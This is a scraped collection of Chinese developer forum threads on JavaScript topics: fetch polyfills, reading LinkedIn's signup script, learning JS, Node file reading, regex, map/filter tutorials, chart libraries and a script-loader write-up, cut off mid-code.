那是在环境里没有 fetch api 才会打上补丁的", "可以试试 whatwg-fetch", " 你没理解这问题。我是用了 whatwg-getch ，但是这类 polyfill 库都会在发现已有原生实现的话直接用原生的。而 qq 的原生实现有问题。", " 这么诡异？我之前也用过这个包，但是我没测手机 QQ 浏览器 /吐血"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>[前端小白]</p>\n<p>如图所示，当点击注册按钮后，网页源码中增加了五行代码，请问怎么查看控制这段代码生成的 js 代码呢？在源码中搜索‘ client_r ’,'client_n'，没找到相关的 js 代码</p>\n<p><img alt=\"\" src=\"http://7rf31y.com1.z0.glb.clouddn.com/Screen%20Shot%202017-02-04%20at%2012.05.41.png\">\n<img alt=\"\" src=\"http://7rf31y.com1.z0.glb.clouddn.com/Screen%20Shot%202017-02-04%20at%2012.05.54.png\"></p>\n<p>网址： <a href=\"https://www.linkedin.com/start/join\" rel=\"nofollow\">https://www.linkedin.com/start/join</a></p>\n</div></div>"], "reply": "5", "tittle": "如何分析 js 代码的运行", "comment": ["右键父元素，断点子树变化。", "chrome 审查元素有个全站搜索功能，可以搜的到，如图\r", "\r", " 非常感谢，请问可有格式化 js 代码的工具么？ ", "  ", " 刚刚试过这两个，貌似会删掉部分代码，在格式化后的代码中搜不到 client 相关关键词。\r", "\r", "最为关键的是这个五个相关的函数\r", "\r", "粗看 client_ts 貌似用到了 jsRandomCalculator ，好像是随机数生成器。。。", " Chrome 本身有这个功能。 ", " 看到了。请问这段代码中，下面两段分别什么意思呢？以及 b 赋值是什么呢？\r", "\r", "a = c.length ? c[0].value : d.length ? d[0].value : \"\"; \r", "d = b.find(\"input[name\\x3demail]\")\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "function l(b) {\r", "        b.on(\"submit\", function() {\r", "            var c = b.find(\"#session_key-login\"), d = b.find(\"input[name\\x3demail]\"), a, e, f;\r", "            a = c.length ? c[0].value : d.length ? d[0].value : \"\";\r", "            Date.now || (Date.now = function() {\r", "                return (new Date).getTime()\r", "            }\r", "            );\r", "            c = Date.now();\r", "            d = m().join(\":\");\r", "            f = a + \":\" + d;\r", "            window.jsRandomCalculator ? (e = window.jsRandomCalculator.computeJson ? window.jsRandomCalculator.computeJson({\r", "                ts: c,\r", "                n: d,\r", "                email: a\r", "            }) : window.jsRandomCalculator.compute(d, a, c),\r", "            a = window.jsRandomCalculator.version) : a = e = \"\";\r", "            g(\"client_ts\", c, b);\r", "            g(\"client_r\", f, b);\r", "            g(\"client_output\", e, b);\r", "            g(\"client_n\", d, b);\r", "            g(\"client_v\", a, b)\r", "        })\r", "    }\r", "    function m() {\r", "        var b = [], c;\r", "        for (c = 0; 3 > c; c++)\r", "            b[c] = Math.floor(9E8 * Math.random()) + 1E8;\r", "        return b\r", "    }\r", "    function g(b, c, d) {\r", "        var a = $(\"input[name\\x3d\" + b + \"]\", d);\r", "        a.length ? a.val(c) : (a = document.createElement(\"input\"),\r", "        a.setAttribute(\"type\", \"hidden\"),\r", "        a.setAttribute(\"name\", b),\r", "        a.setAttribute(\"value\", c),\r", "        d.append(a))"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>写了 3 年 c/c++了，最近因为项目问题，我需要学习些前端的知识。</p>\n<p>上次发了个帖子，说想把项目改成 html5 的，然后又要兼容 xp 后来被网友嘲笑了……用 js 是不是能够做到？</p>\n<p>对于 js 的了解并不多，但是也听说过 js 有很多库，我现在需要上手的话，应该如何？直接拿手册上，从 demo 开始？还是如何？</p>\n<p>麻烦大家推荐相应的系列神马的，多谢，基础入门哈，毕竟安装环境神马的都不知道……</p>\n</div></div>", "<div class=\"topic_content\">关于兼容 xp 的问题，果然我还是了解的不透彻啊，有人能帮忙解释下么？我这里目前是一个客户端，每次绘制界面的时候，都是我最痛苦的时候，所以我的想法是将其改为 web 模式，目前应该是想要利用 notewebkit 来实现桌面版客户端+web 的展现，但是应该如何进行， html5 貌似上次被砍死， js 也不行？</div>"], "reply": "46", "tittle": "因为项目问题，需要学习 js", "comment": ["《 JavaScript 高级程序设计》", "对于有 C/C++ 基础的人来说，这可以算是入门教程了。", "你应该跳过 js 直接去看 jquery 才对. js 短时间上手不了, jq 就简单的多了,很多兼容也不用考虑.低版本浏览器记得用低版本的 jquery 就可以了.", "关键看你想用 js 做什么，如果只是做简单的表单较验，找段现成的代码用或者自己写都没有任何难度。\r", "\r", "bootstrap + jquery + Vue + 各种库", "直接上手最速度，然后回头再看书效果最好.", "兼容性要求较高的话，建议直接上手 jQuery 。《锋利的 jQuery 》配合 jQuery 官方文档，再加上 Google 就够了。 HTML 、 CSS 、 JavaScript 的基础知识可以看 MDN 。", "歪个楼。。。\r", "\r", "\r", "scala 表示可以看这个\r", " ", " #1 这本书我还真有……晚点看看去", "\r", "\r", "新手学会 jq 就行了,不需要那么多高大上的东西,进阶可以学 vue", " #3 这样啊，可是不看基础直接看库真的好么？\r", "\r", " #4 简单的功能我知道可以直接找现成代码，我主要是需要将目前的界面全部改写……感觉这个不会 js 本身不行吧\r", "\r", " #5 问下你回复的这些有先后顺序么？\r", "\r", " #6 嗯，先看点基础，然后直接奋战项目\r", "\r", " #7 多谢，我去找找这本书，对于基础 html 、 css 略知一二", "有 c c++ 基础可以考虑直接学的 typescript", " #12 这个我还是第一次听说，优势在于？", "看 typescript 也可以啊， js 高程看起来还是蛮耗时间的。", " #14 有个看过 js 高程的小伙伴和我说，这本书难懂……不知道是不是因为他太菜", " #12 \r", " #14 \r", "\r", "看了下 typescript 的介绍和例子，这家伙是有自己的语言规范，然后通过编译器生成 js 文件？看着有点牛逼啊", " typescript 对于有静态编译型语言经验的人来说，非常容易上手，一看就会用。然后 jquery 是要学的，它是 js 与 html 之间的桥梁。", " js 语法上没什么难点， js 高程内容多，看起来耗时间，但是没什么很难的知识点。", "如果你学 js ，那么 var 与 let 的区别、变量作用域、类型的隐性转换、闭包、函数的两种定义方法、 this 究竟指向哪里、原型链等知识点都会让你有点烦……但 js 毕竟是个小巧的语言，也不会太难学。", "说到 XP ，推荐你还是写回 C++", "兼容 xp 和 js 有什么关系？\r", "js 的兼容行只和浏览器有关吧，你要兼容 IE ？", "是要用客户端 js 吧", "你还是直接上 qt 吧。用 qt 的 script", "c 也可以编成 js 楼主可以主要看看环境搭建和转译啥的", "为啥我写了一年多的 js 还不会 jquery …", "作為一個 c++老手可以這樣做：打開一個編輯器，暗示自己已經會 js 了，然後直接寫就可以了。遇到問題再查文檔（ mdn ）即可：）", " 原来如此，大概了解了\r", " 恩恩，有时间看看那书，目前应该是需要尽快实现\r", " 听说 js 好学……听说而已，我想应该不会比 c 难吧\r", " js 在 xp 下会有问题？\r", " 肯定不会用 ie 啊，应该是使用 notewebkit 来做吧，因为这方面我不太了解，所以准备先写出 demo 试试看\r", " 这也可以？从来没有听过啊，有关键词什么的参考下么？\r", " 已下载 webstorm ，并将 dash 中各大 js 文档下载完成", " \r", " ", "提到兼容性想来不是浏览器端的 js 吧， electron 不支持 xp ， nwjs 是支持 xp 的", " #27 万分感谢，我研究研究\r", "\r", " #29 竟然有 list ，哇咔咔\r", "\r", " #30 汗，用 js 的话，还是会存在对 xp 兼容性问题？这就尴尬了", "这个看完应该就会 js 了\r", " 没有顺序", "桌面客户端兼容 XP 难道不是用 C#吗？何况你还是写 C 的？用 js 何苦来着？用 C#写界面很痛苦吗？当年用 MFC 都不觉得。用 js 底层也还是 C++写的引擎，但是多了一层转换，在 XP 打开的那种效果。。。你的客户内存都用多大？", "楼主是在 win 下用 C++写客户端程序么？", " #32 多谢推荐\r", " #33 好的\r", " #34 c#确实我没有考虑过，不过我确实在用 mfc 写界面，不痛苦么？基本所有用到的控件都是重绘的\r", " #35 如上", "看了半天也没看懂楼主想做 B 端还是 C 端， B 端和系统没关系， C 端直接上 C#不是更好", "楼主好像是做客户端？上 electron", "楼主的意思是：做一个跑在 windows 上的客户端程序，但界面用 HTML 来展现么？\r", "\r", "如果是这样，用 c 应该也可以实现：内嵌一个浏览器控件作为 UI 窗口，其他的该怎么写还怎么写。\r", "\r", "如果想趁此机会学习一下基于 js 的前端技术栈，可以考虑上 Electron ，我正在学习中。这是一个跨 PC 平台的框架，可以用 HTML 展现界面，用 js 写逻辑，并且支持 nodejs 的本地 API ，看起来很理想，但涉及的技术栈确实庞大。基本上要先理解这些概念，以及他们是什么关系，如何工作的：\r", "\r", "js （语言）\r", "nodejs （运行环境）\r", "npm （管理工具）\r", "AMD/CMD （管理规范）\r", "html （语言）\r", "css （语言）\r", "electron （框架）\r", "vscode （ IDE ）", "如果不局限于 js ，可以考虑用 qt 或者 java 吧？", " nwjs 可以兼容 xp 呀，就像我说的，但 electron 就妥妥的不行了。 nwjs 也是很不错的项目，当初写 electron 的大神也是先做 nwjs 的 contributor ，后来才发布的 electron", "Python + PySide （ Qt ） 怎么样", "做客户端为什么要用 JS ？就像你用 C++写前端似的。\r", "写 GUI 还是用 C++和 C#好，其他都很勉强。\r", "推荐 Qt ！跨平台，能用 CSS 写界面，就不痛苦了。\r", "语言是和平台无关的，是否支持 XP 要看解释器或者编译器支持不支持，还有使用的库、框架。", "没太明白你的意思。\r", "- 如果是用`C++`开发客户端，然后用`HTML`+`CSS`+`javascript`开发用户界面的话，这个我不熟悉。但是只是操作下`DOM`的话，可以学下`jQuery`。\r", "- 如果是用`javascript`开发跨平台的客户端应用的话，可以用[electron]( ", " 7 +`，而且你需要了解`js`、`nodejs`和`nodejs`下的异步编程（ callback 、 promise 、 generator 、 async /await ）。\r", "\r", "`jQuery`的话可以看看[learn jquery]( ", "\r", "`js`的话推荐[exploringjs](exploringjs.com)，从 ES5 到 ES2017 都有，而且都提供免费在线版本。此外**javascript 高级程序设计**也是很推荐的。", "xp 最高可以装到.net 4.0 ， c#比较好吧。。。", "像某一楼说的，如果 js 不是硬性条件的话可以考虑学 typescript ，上手应该会比 js 快一点(当然 js 基础是无论如何都要学的)。另外如果楼主英语还行的话，建议去上几门的 mooc 课(建议选一些收费的， 10-20 刀之类的)，个人认为系统性的学一下前端开发比自己一个人啃书效率要更高。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>作为编程语言界的当红辣子鸡， JavaScript 已将其触角延伸到了很多领域，变换出了很多新奇的玩法，我试图探索一些 JavaScript 很少为人所知的玩法：</p>\n<p><a href=\"http://mp.weixin.qq.com/s/mzVWghn601xzjLC76eWYrw\" rel=\"nofollow\">http://mp.weixin.qq.com/s/mzVWghn601xzjLC76eWYrw</a></p>\n<p>还有什么比较有趣的事情是 JavaScript 能够做的，欢迎大家补充~</p>\n</div></div>"], "reply": "4", "tittle": "JavaScript 很少为人所知的玩法", "comment": ["这个所谓的定律，有点一本正经胡说八道的感觉。", "尽管软广嫌疑，确实还是挺有意思的", " 但是很有可能成真", "mark mark"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>读取 root 目录下文件，讲非文件夹的文件名压入数组，最后返回</p>\n<pre><code>function readdir(root) {\n    return new Promise(\n        (resolve, reject) =&gt; {\n            fs.readdir(root, (err, files) =&gt; {\n                if (err) {\n                    reject(err);\n                } else {\n                    var folderdata = [];\n                    files.forEach(file =&gt; {\n                        var ps = path.join(root, file);\n                        var stat = fs.statSync(ps);\n                        if (!stat.isDirectory(file)) {\n                            file = path.basename(file);\n                            folderdata.push(file);\n                        }\n                    })\n                    resolve(folderdata)\n                }\n\n            })\n        }\n    )\n}\nvar fs2 = readdir(root).then((folderdata) =&gt; {\n    console.log(folderdata)\n});\n\n</code></pre>\n<p>这样打印</p>\n<pre><code>[ '.DS_Store',\n  '.babelrc',\n  'app.js',\n  'package.json',\n  't2.js',\n  'test.js',\n  'test2.js' ]\n</code></pre>\n<p>我想将这数组直接赋值给 fs2 ，应该怎么修改代码呢</p>\n</div></div>"], "reply": "4", "tittle": "js 读取目录，将目录内文件和目录分别压入数组", "comment": ["```js\r", "var fs2 = [];\r", "\r", "readdir(root).then((folderdata) => {\r", "  fs2 = folderdata;\r", "  // do something else\r", "});\r", "```", "这里读取目录是异步操作，封装在 Promise 对象中，只能用过调用 then 传入回调函数来获得结果。直接赋值得到的还是 Promise 对象。\r", "fs 模块的函数一般都有 Sync 形式，但会阻塞线程。", "不明白为什么 readdir 用异步但是 stat 用同步。。", "node7 可以 fs2 = await readdir(root)"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>文本</p>\n<pre><code>var text = 'Marvels.Agents.of.S.H.I.E.L.D.S04E12.720p.HDTV.x264-FLEET Marvels.Agents.of.S.H.I.E.L.D.S04E12.720p.WEB-DL.DD5.1.H264-RARBG Marvels.Agents.of.S.H.I.E.L.D.S04E13.720p.WEB-DL.DD5.1.H264-RARBG';\n</code></pre>\n<p>代码</p>\n<pre><code>var reg = /(\\w\\S*)+/g;\nvar arr = reg.exec((text));\nconsole.log(arr);\n</code></pre>\n<p>Console\n<img alt=\"\" src=\"https://ww3.sinaimg.cn/large/006tNbRwgy1fcj57dnw51j3158076jt7.jpg\"></p>\n<p>其他网站\n<img alt=\"\" src=\"https://ww4.sinaimg.cn/large/006tNbRwgy1fcj58o9abqj312s0pmn16.jpg\"></p>\n<p>Console 匹配出来的和其他网站匹配出来的不一样，该如何修改？求教</p>\n</div></div>"], "reply": "4", "tittle": "这段如何用正则来匹配？", "comment": ["```\r", "var arr = text.split(\" \");\r", "```\r", "换成这个解决了。。。", "用错了方法   exec  这个方法只会返回匹配的第一个字符串   换成这样其实就行了     var arr = text.match(reg);", " #2 是的，我用 split 解决了。。", "能用 split 当然不用正则"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>打算每周写一篇文章，这是本周的文章，发出来大家一起分享一下。原文地址：</p>\n<p><a href=\"http://www.jianshu.com/p/c4a77e5b8313\" rel=\"nofollow\">http://www.jianshu.com/p/c4a77e5b8313</a></p>\n<p>前两周的文章：</p>\n<p>《什么是 MVVM 模式？》， <a href=\"http://www.jianshu.com/p/a898ef83f38c\" rel=\"nofollow\">http://www.jianshu.com/p/a898ef83f38c</a></p>\n<p>《做 JavaScript 开发的同学，快来加入 TypeScript 大家庭吧！》， <a href=\"http://www.jianshu.com/p/f035cb4b9a40\" rel=\"nofollow\">http://www.jianshu.com/p/f035cb4b9a40</a></p>\n<hr>\n<p>最近一直想写一系列文章，好好介绍一下 JavaScript 下的函数编程，以及 ReactiveX 这个神器。拖延症犯了，连提纲都没规划出来。不过真心想聊这个话题，今天就先聊一聊一些简单的小技巧。</p>\n<h2>如何理解 Array 的 map 函数 ？</h2>\n<p>我们先来看一个简单的例子，假设有一个数组 [1,2,3,4]，如果想对里面所有的数全部加上 10 ，那么最普通的做法就是：</p>\n<pre><code>var input = [1,2,3,4];\nvar output = [];\nfor(var i = 0; i &lt; input.length; i++ ) {\n    var newData = input[i] + 10 ;\n    output.push(newData);\n}\nconsole.log(output);\n</code></pre>\n<p>再来看另外一个稍微复杂一点的例子，假如我们从网路读取到一批数据，然后把他们渲染到页面上：</p>\n<pre><code>var dataList = getJsonFromRemote();\nvar output = [];\nfor(var i = 0; i &lt; dataList.length; i++ ) {\n    var el = '&lt;li&gt;' + dataList[i] + '&lt;/li&gt;'\n    output.push(el);\n}\nconsole.log(output);\n</code></pre>\n<p>我们来观察一下这两个例子有什么样的共性？他们都是从一个数组中循环读出每一个数据，然后通过计算后得到一个新数据，然后放入到一个数组中，那我们来对代码进行一些优化：</p>\n<pre><code>function add(data) {\n    return data + 10;\n}\n\nvar input = [1,2,3,4];\nvar output = [];\nfor(var i = 0; i &lt; input.length; i++ ) {\n    var newData = add(input[i]);\n    output.push(newData);\n}\nconsole.log(output);\n</code></pre>\n<pre><code>function renderLi(data) {\n    return '&lt;li&gt;' + dataList[i] + '&lt;/li&gt;';\n}\n\nvar input = getJsonFromRemote();\nvar output = [];\nfor(var i = 0; i &lt; input.length; i++ ) {\n    var newData = renderLi(input[i]);\n    output.push(el);\n}\nconsole.log(output);\n</code></pre>\n<p>我们把这两个代码片段中的循环逻辑修改成了一个小函数，大家再对比一下这两个 for 循环内部，几乎只有那个“小函数”的名字不一样，其他部分一模一样，我们给这个“小函数”一个好听的名字——算法。</p>\n<p>对，我们在对一个数组进行循环处理时，大部分情况下，如果他们的输入是一个合法的数组，输出也是一个合法的数组，唯一不同的只是他们的“算法”不一样而已。于是，我们再来优化一下代码：</p>\n<pre><code>function map(array, func) {\n    var output = [];\n    for(var i = 0; i &lt; array.length; i++ ) {\n        output.push(func(array[i]));\n    }\n    return output;\n}\n\nfunction add(data) {\n    return data + 10;\n}\n\nfunction renderLi(data) {\n    return '&lt;li&gt;' + data[i] + '&lt;/li&gt;';\n}\n\nvar input1 = [1,2,3,4];\nvar output1 = map(input1, add);\n\nvar input2 = getJsonFromRemote();\nvar output2 = map(input2, renderLi);\n</code></pre>\n<p>我们把一个 for 循环实现成了一个 map 函数，它接受两个参数：一个是数组，一个是算法函数。于是在我们下面的调用中，就再也看不到 for 循环的代码了。</p>\n<p>目前的 map 函数接受两个参数，跟我们最开始提到的 Array 对象的 map 函数还稍微有一点点差异，我们再调整一次：</p>\n<pre><code>class Array {\n    constructor() {\n        this._list = [];\n    }\n\n    map(func) {\n        var output = [];\n        for(var i = 0; i &lt; this._list.length; i++ ) {\n            output.push(func(array[i]));\n        }\n        return output;\n    }\n}\n</code></pre>\n<p>我们把一个普通的 map 函数放到 Array 类上，那么它也只需要接受一个参数了，就是“算法”。所以我们的逻辑代码也相应调整为：</p>\n<pre><code>[1,2,3,4].map(function(item) {\n    return item + 10;\n});\n\ngetJsonFromRemote().map(function(item) {\n    return '&lt;li&gt;' + item[i] + '&lt;/li&gt;';\n});\n</code></pre>\n<h2>如何理解 Array 的 filter 函数 ？</h2>\n<p>如果 for 循环以后都变成了 map 函数调用的话，那么大家一定会有一个疑问：如果并不是想对一个数组进行“算法变化”，而只是想获取原数组中“符合规格”的那部分数据，该怎么做呢？</p>\n<p>这是就该 filter 出场了，看名字就可以知道，它就是一个过滤器。假设有一个 number 数组，我们只想获取它的偶数。我们先还是来看看传统的“笨办法”：</p>\n<pre><code>var input = [1, 2, 3, 4, 5, 6, 7, 8, 9];\nvar output = [];\nfor(var i = 0; i &lt; input.length; i++ ) {\n    if(input[i] % 2 == 0) {\n        output.push(input[i]);\n    }\n}\nconsole.log(output);\n</code></pre>\n<p>然后我们在用学习 map 时的办法，来对他进行一下优化：</p>\n<pre><code>function filter(input, func) {\n    var output = [];\n    for(var i = 0; i &lt; input.length; i++ ) {\n        if(func(input[i])) {\n            output.push(input[i]);\n        }\n    }\n    return output;\n}\n\nfunction even(data) {\n    return input[i] % 2 == 0;\n}\n\nvar input = [1, 2, 3, 4, 5, 6, 7, 8, 9];\nvar output = filter(input, even);\nconsole.log(output);\n</code></pre>\n<p>可以看到 filter 函数和 map 函数的实现很相似，主体依然是 for 循环，不过循环体的内部是先调用算法计算数据，然后依据计算结果来选择是否把当前数据复制到 output 中，结果为 true 则保留，为 false 则过滤掉。 even 函数的作用就是对传入的数据进行判断，如果是偶数，则返回 true 。最终的版本如下：</p>\n<pre><code>[1, 2, 3, 4, 5, 6, 7, 8, 9].filter(function(item) {\n    return item[i] % 2 == 0;\n});\n</code></pre>\n<h2>综合范例</h2>\n<p>我们接下来来实现一个非常真实的业务逻辑：我们用 nodejs 读取一个文件夹下所有的第一层子文件夹的名字，然后转化为绝对路径(以下代码暂时不考虑错误逻辑)。</p>\n<pre><code>var fs = require('fs');\nvar path = require('path');\n\nvar dirPath = '...';\nvar contentList = fs.readdirSync(dirPath);  //读取文件夹下的所有内容\nvar output = [];\nfor(var i = 0; i &lt; contentList.length; i++) {\n    var name = contentList[i];\n    var subDirPath = path.resolve(dirPath, name); // 获取绝对路径\n    if(fs.statSync(subDirPath).isDirectory()) {  // 判断是否为文件夹，排除掉文件\n        output.push(fullPath);\n    }\n}\n</code></pre>\n<p>再来看看优化实现：</p>\n<pre><code>var fs = require('fs');\nvar path = require('path');\n\nvar dirPath = '...';\nvar output = fs.readdirSync(dirPath).map(function(item){\n    return path.resolve(dirPath, item);\n}).filter(function(item) {\n    return fs.statSync(item).isDirectory();\n});\n</code></pre>\n<p>再换成 lambda 版本看看？</p>\n<pre><code>var fs = require('fs');\nvar path = require('path');\n\nfunction getSubDirList(dirPath) {\n    return fs.readdirSync(dirPath)\n        .map(item =&gt; path.resolve(dirPath, item))\n        .filter(item =&gt; fs.statSync(item).isDirectory());\n}\n\nvar dirPath = '...';\nvar output = getSubDirList(dirPath);\n</code></pre>\n<p>怎么样？ 有没有很清爽的感觉？不过我更喜欢下面这种美妙的写法：</p>\n<pre><code>var R = require('ramda');\nvar fs = require('fs');\nvar path = require('path');\n\nvar getSubDirList = R.compose(\n    R.filter(item =&gt; fs.statSync(item).isDirectory()),\n    R.map(item =&gt; path.resolve(dirPath, item)),\n    fs.readdirSync\n);\n\nvar dirPath = '...';\nvar output = getSubDirList(dirPath);\n</code></pre>\n<p>最后这段代码有人能看明白么？卖个关子，下次再讲。</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "来讲一讲如何理解 JavaScript 中 Array 的 map/filter 函数", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://www.web-tinker.com/article/20722.html\" rel=\"nofollow\">次碳酸钴</a>说是所有连接断开后回收，然而好像不是这样，标准怎么说的呢？</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "SharedWorker 什么时候回收？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><strong>文字+图标</strong> <a href=\"https://www.tshe.com/c/0abe97ec\" rel=\"nofollow\">https://www.tshe.com/c/0abe97ec</a></p>\n<p><img alt=\"a\" src=\"https://ooo.0o0.ooo/2017/02/07/5899abc173ee2.png\"></p>\n<p><strong>仅图标</strong> <a href=\"https://www.tshe.com/c/408bea3f\" rel=\"nofollow\">https://www.tshe.com/c/408bea3f</a></p>\n<p><img alt=\"b\" src=\"https://ooo.0o0.ooo/2017/02/07/5899ab4c68adf.png\"></p>\n</div></div>"], "reply": "15", "tittle": "Webpack T 恤预售", "comment": ["话说，你们是怎么的到开发者的授权的，一般怎么联系比较好？ 邮箱？", "得到", "求黑色纯图标版，或者深蓝色也行…", " 啊，忘了还有这回事，因为之前 Vue 的 T 恤没什么问题。不过我刚刚问了一下 Webpack 的 @", " 坐等回复 😂", " 有黑色，点进去可以看到，这里只是预览", "第一眼：\r", "黑的，凸点\r", "蓝的，蜘蛛侠", " 蓝的那件弄成红的更像蜘蛛侠 😂", "深怕别人不知道你是前端吗……真搞不懂", "。。连 webpack 都有 t 了", " 深怕别人知道你是前端吗", "webpack 都有信仰值了。。。", "可以来一发... 感觉不错哦.\r", "不贵的话可以买一个.", " 😏😏😏", "这个 logo 让我想起了王者荣耀墨子的大招 😂😂😂", "失败了呀~~~"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>公司最近有个移动端的数据展示需求，之前没做过这方面的东西。看前端招聘里，貌似都是 D3.js 、 hightcharts.js 、 echarts.js ，不知道各位用的啥，给推荐一个也行。另外，最好能很方便配合jquery或vue开发。感谢</p>\n</div></div>", "<div class=\"topic_content\">那就用 echarts 了</div>"], "reply": "14", "tittle": "各位前端都用的啥数据可视化框架", "comment": ["d3, echarts", "百度的 exhaust", "尴尬输入法补全，是百度的 echarts", "echarts 无缝配合 jquery ， vue 也没啥冲突的\r", "就是 SVG 和 Canvas 的喜好问题", "百度 echarts", "hightcharts", "echarts 妈妈再也不用担心我的图表了", "除非上万的数据点，否则差异不大的", "大手子不都是用 d3 的吗", "用过 g2 ， echarts", "d3", "如果有特殊的定制化需求 d3 比较合适，通用型的图表 echarts 基本可以满足了", "开源的都在这里了 ", "炫酷到爆的 d3V4 再也不怕 UI 的刁难了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>翻译了一篇 github 上的 clean-code-javascript ， 写 JavaScript 的 V 友来看看吧！</p>\n<p>原 Repo 地址为： <a href=\"https://github.com/ryanmcdermott/clean-code-javascript\" rel=\"nofollow\">ryanmcdermott/clean-code-javascript</a> ， 我的 Repo 地址为： <a href=\"https://github.com/beginor/clean-code-javascript\" rel=\"nofollow\">beginor/clean-code-javascript</a> 。</p>\n<p>直接查看 <a href=\"https://github.com/beginor/clean-code-javascript/blob/master/README-zh-CN.md\" rel=\"nofollow\">Clean Code JavaScript 中文版</a> 。</p>\n<p>翻译中保留了部分英文原文， 我拿不准， 或者我觉得可以有更好的翻译。 如果你有更好的翻译， 欢迎提交 PR ， 也欢迎 Star 。</p>\n<p>希望写 JavaScript 的程序猿 /媛共勉之！</p>\n</div></div>", "<div class=\"topic_content\">直接浏览的地址修改为 <a target=\"_blank\" href=\"https://github.com/beginor/clean-code-javascript/blob/master/README.md\" rel=\"nofollow\">https://github.com/beginor/clean-code-javascript/blob/master/README.md</a></div>"], "reply": "4", "tittle": "代码整洁之道 —— JavaScript", "comment": ["没有人有任何反应，难道我的翻译是一坨翔？", "mark 路上看~", "不是的，原 repo 下已经有一个中译了，你算重复劳动了，不过还是要支持一下楼主", " 确实是， 我开始翻译的时候还没有呢，郁闷了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><blockquote>\n<p><strong>记录一些要点，以便于常记起时有据可循！</strong></p>\n</blockquote>\n<p><strong>1 、静态资源与主站分离</strong></p>\n<p>上了规模的站点将静态资源分离出来是非常有必要的，好处也是很大的：</p>\n<p>（ 1 ）、 CDN 加速，大胆开启强缓存，降低 DNS 解析和请求的时间；</p>\n<p>（ 2 ）、静态资源的 http 请求和一些在服务器上的 commbo ，会耗费大量服务器资源，分离后会大大减少主站服务器压力；</p>\n<p>（ 3 ）、减少 http 请求头携带的内容，除非后端在 cookies 的作用域做了明确的限制，要不然静态资源的 http 请求头也会携带大量与其无关的内容；</p>\n<p>（ 4 ）、统一管理静态资源的存储与调用，能有效的防止各个站点之间对一些资源的交叉使用造成资源叠加冗余浪费服务器空间，以便于共享缓存；</p>\n<p><strong>2 、关于印链</strong></p>\n<p>目前我负责的项目是一个对接印刷厂的 ERP 系统（印链）；</p>\n<p>印链 2.0 以前还不够成熟，业务逻辑也相对简单，总体代码量较小，当时的 js 只是页面上直接 src 的几个文件，由于浏览器的同步加载模式，为了防止 js 的加载执行会阻塞页面的渲染以及可能出现的 DOM 节点 undefined 操作，所以一股脑把 js 放最底部加载就行了；印链 2.0 以后，步子放开了，代码量大增，这时就感觉之前这种加载方式越来越不顺心了，同时各个业务模块之间的代码交叉混杂的情况也越来越多，很不便于维护，为了赶在老大发现问题之前，避免挨骂，就在空余时间准备对全站的 js 使用 Seajs 进行模块化改造；</p>\n<p>到了 2.0 阶段，项目已经是大势已成，要对全站的 js 改造的话，风险非常大，<a href=\"http://%E5%90%8C%E6%97%B6%E5%90%8E%E7%AB%AF%E6%98%AF.NET\" rel=\"nofollow\">同时后端是.NET</a> 将 js 文件的引用路径写进了配置文件，要想每个页面各自一个对应的 js 文件，是很不靠谱的做法，我要做很大改动，后端改动也很大；为了将后端的改动降到最低，同时每个页面能够按需加载 js 并且对之前的代码进行平滑的模块化切分，想来想去，引入了一个 main.js 作为全站的入口主模块，来分发各个页面所需的模块；这样后端永远只需配置两个 js 文件的引用路径（ Jquery 和 main.js ）； main.js 非常简单，就是一个全站各个页面、或按业务板块分的配置 json ，指明哪个版块需要哪些 js 模块（合并后的），然后就是一个异步加载模块和一个预加载模块； main.js 大致如下：</p>\n<pre><code>var clearAllCacheReg=/(,cache:')\\w+(')/;//$1w567$2\nvar staticFilesConf={\n\tpath:'/path/to/path/',\n\tmaps:{\n\t\tlogin:{//登陆\n\t\t\tname:'login',cache:'yl.20170104'\n\t\t},                                \n\t\tbaseSettings:{//基础资料\n\t\t\tname:'baseSettings',cache:'yl.20170113'\n\t\t}     \n\t\t// ......\n\t\t// ......                     \n\t}\n}\nvar YL=function() {\n    function load() {\n        var args=arguments;\n        var head = document.getElementsByTagName('head')[0];          \n        var js = document.createElement('script');          \n        js.type='text/javascript';           \n        js.src=args[0];           \n        head.appendChild(js);          \n        if (document.all) {       \n            js.onreadystatechange = function () {     \n                if (js.readyState == 'loaded' || js.readyState == 'complete') args[1]&amp;&amp;args[1](0);\n            }          \n        } else {                 \n            js.onload = function () {\n                args[1]&amp;&amp;args[1](0);\n            }           \n        }\n        js.onerror=function(){\n            args[1]&amp;&amp;args[1](1);\n        }\n    }\n    function execJSblock(scriptsStr) {\n    \tvar script=document.createElement('script');\n    \tscript.type='text/javascript';\n    \tif (document.all) {\n    \t\tscript.text=scriptsStr;\n    \t}else {\n    \t\tscript.appendChild(document.createTextNode(scriptsStr));\n    \t}\n    \tdocument.body.appendChild(script);\n    }\n\tfunction getHost(){\n\t\treturn $('script:last').length?\n\t\t\t   $('script:last').attr('src').replace(/(.*?\\/\\/.+?)\\/.*/i,'$1'):\n\t\t\t   /^(?:file:|test\\.|web\\.|localhost)|(\\w+\\.cn)$/i.test(location.host)?\n\t\t\t   'http://web.xxxxx.cn':\n\t\t\t   'http://cdn.xxxxx.cn';\t\n\t}\n\tfunction preloadModules(maps,ignores){\n\t\tignores=[].slice.call(ignores.toString());\n\t\t$.each(maps,function(i,o){\n\t\t\tif ($.inArray(o.name,ignores)==-1) new Image().src=getHost()+staticFilesConf.path+o.name+'.js?'+o.cache;\n\t\t});\n\t\treturn YL;\n\t}\n    return {\n        load:load,\n        exec:execJSblock,\n        getStaticFileHost:getHost,\n        preloadModules:preloadModules,\n\t\tuse:function(fn){\n\t\t\tfn&amp;&amp;fn.call(YL,$('body').attr('id'));\n\t\t}\n    }\n}();\n\nYL\n.preloadModules(staticFilesConf.maps,['xxx','xxx'])\n.use(function (type) 